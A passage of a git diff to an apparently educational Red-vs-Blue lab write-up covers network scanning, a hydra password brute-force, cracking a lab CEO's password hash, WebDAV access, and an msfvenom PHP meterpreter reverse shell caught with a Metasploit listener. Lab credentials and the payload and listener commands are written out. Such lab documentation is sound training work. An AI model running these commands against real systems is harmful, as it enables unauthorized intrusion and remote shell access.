@@ -32,8 +32,13 @@ netdiscover -r 192.168.1.0/24
 Capstone machine has an ip of 192.168.1.105.
  
  ### **Navigating the Webserver:**
+ 
+  #### **Service and Version Scan:**
 
-I used the nmap -sV -v 192.168.1.105 command to do a service and version scan on the webserver.
+I used the nmap -sV -v 192.168.1.105 command to do a service and version scan on the webserver. 
+ 
+-sV: Probes open ports to determine service and version info.
+ 
 ```
 nmap -sV -v 192.168.1.105
 ```
@@ -101,7 +106,82 @@ hydra -l ashton -P ./root/Downloads/rockyou.txt -s 80 -f -vV 192.168.1.105 http-
 |:--:|:--:|
 | ashton| leopoldo | 
  
-I logged in the webserver using the above credentials.
+ ### **Cracking the Password :**
+
+I logged in the webserver using the above credentials. And gained access to the &quot;_secret\_folder_&quot;
+ 
+ ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2011.png)
+ 
+ Opening the connect &quot;_connect\_to\_corporate\_folder_&quot; displayed the following information.
+ 
+  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2012.png)
+ 
+ This file had **CEO Ryan's** hashed password.And instructions to connect to the companies webdav server.
+ 
+ I used **Crack Station** to crack Ryan's password.
+ 
+ ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2015.png)
+ 
+ Got following credentials for Ryan.
+ 
+ | Username | Passwd| 
+|:--:|:--:|
+| ryan| linux4u | 
+ 
+ ### **Connect to WebDav server:**
+ 
+ Followed the instructions to connect to the webdav server, using Ryan's credential.
+ 
+  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2016.png)
+ 
+ There is file called **passwddav** with the following contects: 
+ 
+  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2017.png)
+  
+  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2018.png)
+ 
+ ### **PHP Reverse Shell payload:**
+ 
+ #### **Msfvenom**
+
+I used **MSVenom** to upload a PHP reverse shell payload using the following command. Since 
+
+```
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php
+```
+
+Using msfvenom we created a payload – shell.php
+
+![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2019.png)
+ 
+#### ** Metasploit**
+ 
+ I used Metasploit which is a tool suite (a program comprised of multiple tools) for hacking servers and other networked devices. The main tools I used for this task are:
+
+- MSFconsole: The main interface for Metasploit. Offers a centralized console to access all the options and modules. MSFconsole runs on our local machine.
+- Meterpreter: A Linux-style shell that Metasploit launches once I successfully break into a target machine. Meterpreter runs on the compromised machine, not on the local machine.
+
+To reiterate, I used  **MSFconsole** to find vulnerable machines and gain access to it. Once I exploited them, I used Meterpreter on the compromised machine.
+ 
+ ```
+msfconsole
+use multi/handler
+```
+
+Once the payload was successfully uploaded, in order to create the reverse shell, we setup a listener using Metasploit.
+
+![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2022.png)
+ 
+ 
+After loading the exploit and activating the shell.php we uploaded earlier by clicking on it on the webserver, the target server connected to our listener and launched a meterpreter session into their system.
+
+
+ ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2021.png)
+ 
+ 
+ 
+ 
+ 
  
  
 
